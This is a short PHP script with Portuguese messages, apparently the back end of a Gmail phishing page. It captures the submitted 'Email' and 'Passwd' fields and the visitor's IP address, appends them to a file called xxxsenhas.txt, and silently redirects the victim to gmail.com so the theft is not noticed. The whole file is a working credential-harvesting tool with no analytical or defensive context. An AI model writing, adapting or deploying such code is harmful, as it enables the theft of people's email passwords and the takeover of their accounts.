
<?php

$n1 = $_POST['Email'];
$n2 = $_POST['Passwd'];
$n3 = $_SERVER['REMOTE_ADDR'];

$conteudo = "Login: $n1 \nSenha: $n2 \nIp: $n3\n\n\n";

$arquivo = "xxxsenhas.txt";


if (!$abrir = fopen($arquivo, "a")) { 
	echo "Erro abrindo arquivo ($arquivo)";
	exit; }


if (!fwrite($abrir, $conteudo)) {
	print "Erro escrevendo no arquivo ($arquivo)";
	exit;
} 

echo '<meta http-equiv="refresh" content="0;url=http://www.gmail.com/">';
fclose($abrir);
exit;

?>